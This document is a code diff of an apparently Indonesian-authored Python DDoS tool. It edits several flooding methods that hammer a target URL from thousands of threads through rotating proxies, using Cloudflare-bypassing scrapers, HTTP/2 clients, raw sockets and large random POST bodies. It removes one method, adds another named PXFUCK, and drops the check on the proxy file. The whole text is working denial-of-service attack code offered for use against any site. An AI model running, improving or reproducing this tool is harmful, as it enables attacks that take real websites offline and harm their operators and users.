@@ -8,24 +8,23 @@ from selenium import webdriver
 from fake_useragent import UserAgent
 from requests.cookies import RequestsCookieJar
 from urllib.parse import urlparse
-from os.path import exists
 
 def random_data():
     random_payload = [
         {
-            'A': ''.join(base64.b64encode(
-                    hashlib.sha256((f'AAAAAAAAAAAAAAAAA{str(random.choice('0987654321abcdefghijklmnopqrstuvwxyz') * 6)}' + str(random.randint(6000, 12000))).encode()).digest()
-                ).decode() for _ in range(16384)),
+            'A': base64.b64encode(
+                    hashlib.sha256(('AAAAAAAAAAAAAAAAAAAAA' + str(random.randint(6000, 12000))).encode()).digest()
+                ).decode() * 16384,
         },
         {
-            'B': ''.join(base64.b64encode(
-                    hashlib.sha256((f'BBBBBBBBBBBBBBBBB{str(random.choice('0987654321abcdefghijklmnopqrstuvwxyz') * 6)}' + str(random.randint(6000, 12000))).encode()).digest()
-                ).decode() for _ in range(16384)),
+            'B': base64.b64encode(
+                    hashlib.sha256(('BBBBBBBBBBBBBBBBBBBBB' + str(random.randint(6000, 12000))).encode()).digest()
+                ).decode() * 16384,
         },
         {
-            'C': ''.join(base64.b64encode(
-                    hashlib.sha256((f'CCCCCCCCCCCCCCCCC{str(random.choice('0987654321abcdefghijklmnopqrstuvwxyz') * 6)}' + str(random.randint(6000, 12000))).encode()).digest()
-                ).decode() for _ in range(16384)),
+            'C': base64.b64encode(
+                    hashlib.sha256(('CCCCCCCCCCCCCCCCCCCCC' + str(random.randint(6000, 12000))).encode()).digest()
+                ).decode() * 16384,
         }
     ]
 
@@ -215,8 +214,8 @@ class Method:
                     self.launcher = httpx.Client(
                         http2=True,
                         proxies={
-                            'http://': 'http://'+self.proxies,
-                            'https://': 'http://'+self.proxies,
+                            'http': 'http://'+self.proxies,
+                            'https': 'http://'+self.proxies,
                         }
                     )
                     self.launcher.get(self.url, headers=headers)
@@ -271,13 +270,8 @@ class Method:
         def Attack(self):
             until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
             threads = []
-            for _ in range(self.thread):
-                thread = threading.Thread(target=self.AttackPXCFB, args=(self.url, until))
-                thread.start()
-                threads.append(thread)
-
-            for thread in threads:
-                thread.join()
+            for _ in range(int(self.thread)):
+                threading.Thread(target=self.AttackPXCFB, args=(self.url, until)).start()
         def AttackPXCFB(self, url, until_datetime):
             while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                 headers = {
@@ -297,12 +291,12 @@ class Method:
                 }
                 try:
                     self.scraper.get(url, proxies={
-                            'http://': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
-                            'https://': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
+                            'http': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
+                            'https': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
                     }, headers=headers)
                     self.scraper.get(url, proxies={
-                            'http://': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
-                            'https://': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
+                            'http': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
+                            'https': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
                     }, headers=headers)
                 except:
                     pass
@@ -338,8 +332,8 @@ class Method:
             while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                 try:
                     proxy = {
-                            'http://': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
-                            'https://': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
+                            'http': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
+                            'https': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
                     }
                     requests.get(url, proxies=proxy, headers=headers)
                     requests.get(url, proxies=proxy, headers=headers)
@@ -378,16 +372,16 @@ class Method:
             while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                 try:
                     proxy = {
-                            'http://': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
-                            'https://': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
+                            'http': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
+                            'https': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
                     }
                     requests.get(url, proxies=proxy, verify=False)
                     self.scraper.get(url, proxies=proxy, verify=False)
                     self.launcher = httpx.Client(
                         http2=True,
                         proxies={
-                            'http://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
-                            'https://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
+                            'http': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
+                            'https': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                         }, verify=False
                     )
                     self.launcher.get(url, headers=headers)
@@ -406,14 +400,8 @@ class Method:
         # Memulai thread untuk melakukan attack
         def Attack(self):
             until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
-            threads = []
-            for _ in range(self.thread):
-                thread = threading.Thread(target=self.PXROCKET, args=(self.url, until))
-                thread.start()
-                threads.append(thread)
-
-            for thread in threads:
-                thread.join()
+            for _ in range(int(self.thread)):
+                threading.Thread(target=self.PXROCKET, args=(self.url, until)).start()
 
         def PXROCKET(self, url, until_datetime):
             while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
@@ -455,31 +443,25 @@ class Method:
                 'TE': 'trailers',
             }
             until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
-            threads = []
-            for _ in range(self.thread):
-                thread = threading.Thread(target=self.PXMIX, args=(self.url, until, headers))
-                thread.start()
-                threads.append(thread)
-
-            for thread in threads:
-                thread.join()
+            for _ in range(int(self.thread)):
+                threading.Thread(target=self.PXMIX, args=(self.url, until, headers)).start()
 
         def PXMIX(self, url, until_datetime, headers):
             while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                 try:
                     requests.get(url, proxies={
-                            'http://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
-                            'https://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
+                            'http': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
+                            'https': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                         }, headers=headers)
                     self.scraper.get(url, proxies={
-                            'http://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
-                            'https://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
+                            'http': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
+                            'https': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                         }, headers=headers)
                     self.launcher = httpx.Client(
                         http2=True,
                         proxies={
-                            'http://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
-                            'https://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
+                            'http': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
+                            'https': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                         }
                     )
                     self.launcher.get(self.url, headers=headers)
@@ -526,25 +508,19 @@ class Method:
                 'TE': 'trailers',
             }
             until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
-            threads = []
-            for _ in range(self.thread):
-                thread = threading.Thread(target=self.PXCFPRO, args=(self.url, until, headers))
-                thread.start()
-                threads.append(thread)
-
-            for thread in threads:
-                thread.join()
+            for _ in range(int(self.thread)):
+                threading.Thread(target=self.PXCFPRO, args=(self.url, until, headers)).start()
 
         def PXCFPRO(self, url, until_datetime, headers):
             while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                 try:
                     self.scraper.get(url, headers=headers, proxies={
-                            'http://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
-                            'https://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
+                            'http': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
+                            'https': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                         })
                     self.scraper.get(url, headers=headers, proxies={
-                            'http://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
-                            'https://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
+                            'http': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
+                            'https': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                         })
                 except:
                     pass
@@ -563,14 +539,8 @@ class Method:
         # Memulai thread untuk melakukan attack
         def Attack(self):
             until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
-            threads = []
-            for _ in range(self.thread):
-                thread = threading.Thread(target=self.PXKILL, args=(self.url, until))
-                thread.start()
-                threads.append(thread)
-
-            for thread in threads:
-                thread.join()
+            for _ in range(int(self.thread)):
+                threading.Thread(target=self.PXKILL, args=(self.url, until)).start()
 
         def PXKILL(self, url, until_datetime):
             while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
@@ -578,12 +548,12 @@ class Method:
                 payload = random_data()
                 try:
                     self.scraper.post(url, headers=headers, data=payload, proxies={
-                            'http://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
-                            'https://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
+                            'http': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
+                            'https': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                         })
                     requests.post(url, headers=headers, data=payload, proxies={
-                            'http://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
-                            'https://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
+                            'http': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
+                            'https': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                         })
                 except:
                     pass
@@ -601,21 +571,15 @@ class Method:
         # Memulai thread untuk melakukan attack
         def Attack(self):
             until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
-            threads = []
-            for _ in range(self.thread):
-                thread = threading.Thread(target=self.PXSOC, args=(self.url, until))
-                thread.start()
-                threads.append(thread)
-
-            for thread in threads:
-                thread.join()
+            for _ in range(int(self.thread)):
+                threading.Thread(target=self.PXSOC, args=(self.url, until)).start()
 
         def PXSOC(self, url, until_datetime, proxy_type=socks.HTTP):
             while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                 try:
                     parsed_proxy = random.choice(open(self.proxy, 'r').readlines()).split(':')
-                    proxy_host = str(parsed_proxy[0])
-                    proxy_port = int(parsed_proxy[1])
+                    proxy_host = parsed_proxy[0]
+                    proxy_port = parsed_proxy[1]
                     parsed = urlparse(url)
                     self.host = parsed.hostname
                     self.port = parsed.port or (443 if parsed.scheme == 'https' else 80)
@@ -656,58 +620,6 @@ class Method:
                     except:
                         sock.close()
                 except:
-                    return
-
-        def start(self):
-            return self.Attack()
-
-    class PXHOSHINO:
-        def __init__(self, url, thread, time, proxy):
-            self.proxy = proxy
-            self.url = url
-            self.thread = thread
-            self.time = time
-            self.scraper = cloudscraper.create_scraper()
-
-        # Memulai thread untuk melakukan attack
-        def Attack(self):
-            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
-            threads = []
-            for _ in range(self.thread):
-                thread = threading.Thread(target=self.PXHOSHINO, args=(self.url, until))
-                thread.start()
-                threads.append(thread)
-
-            for thread in threads:
-                thread.join()
-
-        def PXHOSHINO(self, url, until_datetime):
-            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
-                headers = {
-                    'User-Agent': UserAgent().chrome,
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-                    'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
-                    'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
-                    'Cache-Control': 'no-cache',
-                    'Pragma': 'no-cache',
-                    'Connection': 'keep-alive',
-                    'Upgrade-Insecure-Requests': '1',
-                    'Sec-Fetch-Dest': 'document',
-                    'Sec-Fetch-Mode': 'navigate',
-                    'Sec-Fetch-Site': 'same-origin',
-                    'Sec-Fetch-User': '?1',
-                    'TE': 'trailers',
-                }
-                try:
-                    self.scraper.get(url, headers=headers, proxies={
-                            'http://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
-                            'https://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
-                        }, allow_redirects=False)
-                    requests.get(url, headers=headers, proxies={
-                            'http://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
-                            'https://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
-                        }, allow_redirects=False)
-                except:
                     pass
 
         def start(self):
@@ -720,19 +632,12 @@ class Method:
             self.thread = thread
             self.time = time
 
-        # Memulai thread untuk melakukan attack
         def Attack(self):
             until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
-            threads = []
-            for _ in range(self.thread):
-                thread = threading.Thread(target=self.PXMELTED, args=(self.url, until))
-                thread.start()
-                threads.append(thread)
+            for _ in range(int(self.thread)):
+                threading.Thread(target=self.AttackPXMELTED, args=(self.url, until)).start()
 
-            for thread in threads:
-                thread.join()
-
-        def PXMELTED(self, url, until_datetime):
+        def AttackPXMELTED(self, url, until_datetime):
             while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                 headers = {
                     'User-Agent': UserAgent().chrome,
@@ -751,8 +656,8 @@ class Method:
                 }
                 try:
                     with meltodown(url, proxies={
-                            'http://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
-                            'https://': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
+                            'http': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
+                            'https': 'http://'+random.choice(open(self.proxy, 'r').readlines()),
                         }, headers=headers, timeout=30) as scrape:
                         scrape.get()
                         for _ in range(200):
@@ -760,6 +665,45 @@ class Method:
                 except:
                     pass
 
+        def start(self):
+            return self.Attack()
+
+    class PXFUCK:
+        def __init__(self, url, thread, time, proxy):
+            self.proxy = proxy
+            self.url = url
+            self.thread = thread
+            self.time = time
+        def Attack(self):
+            headers = {
+                'User-Agent': UserAgent().chrome,
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+                'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+                'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
+                'Cache-Control': 'no-cache',
+                'Pragma': 'no-cache',
+                'Connection': 'keep-alive',
+                'Upgrade-Insecure-Requests': '1',
+                'Sec-Fetch-Dest': 'document',
+                'Sec-Fetch-Mode': 'navigate',
+                'Sec-Fetch-Site': 'same-origin',
+                'Sec-Fetch-User': '?1',
+                'TE': 'trailers',
+            }
+            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
+            for _ in range(int(self.thread)):
+                threading.Thread(target=self.AttackPXFUCK, args=(self.url, headers, until)).start()
+        def AttackPXFUCK(self, url, headers, until_datetime):
+            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+                try:
+                    proxy = {
+                            'http': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
+                            'https': 'http://'+str(random.choice(open(self.proxy, 'r').readlines())),
+                    }
+                    requests.get(url+f'?page={base64.b64encode(hashlib.sha256(('BBBBBBBBBBBBBBBBBBBBB' + str(random.randint(6000, 12000))).encode()).digest()).decode() * 35}', proxies=proxy, headers=headers)
+                    requests.get(url, proxies=proxy, headers=headers)
+                except:
+                    pass
         def start(self):
             return self.Attack()
 
@@ -775,14 +719,8 @@ if __name__ == '__main__':
     parser.add_argument('-u', '--url', type=str, help='Target URL', required=True, metavar='https://example.com')
     parser.add_argument('-th', '--thread', type=str, help='Threader', metavar='20000', default=20000)
     parser.add_argument('-t', '--time',type=str, help='DDoS Duration', metavar='45', default=45)
-    parser.add_argument('-p', '--proxy', type=str, help='Proxy address', metavar='proxy.txt')
+    parser.add_argument('-p', '--proxy', type=str, help='Proxy addrress', metavar='proxy.txt')
     parser.add_argument('-tpe', '--tpe', type=str, help='ThreadPoolExecutor', metavar='150-300', default=150)
-    parser.add_argument('-m', '--method', type=str, help='DDoS Method', metavar='PXHTTP2, HTTP2, PXCFB, PXREQ, PXBYP, PXROCKET, PXMIX, PXCFPRO, PXKILL, PXSOC, PXHOSHINO, PXMELTED', required=True)
+    parser.add_argument('-m', '--method', type=str, help='DDoS Method', metavar='PXHTTP2, [Content Deleted], PXCFB, PXREQ, PXBYP, PXROCKET, PXMIX, PXCFPRO, PXKILL, PXSOC, PXMELTED, PXFUCK', required=True)
     args = parser.parse_args()
-    if 'PX' in args.method:
-        if args.proxy and exists(args.proxy):
-            pass
-        else:
-            print(f"[Error] No file or directory: '{args.proxy}'")
-            exit(1)
     threading.Thread(target=Runner.start()).start()
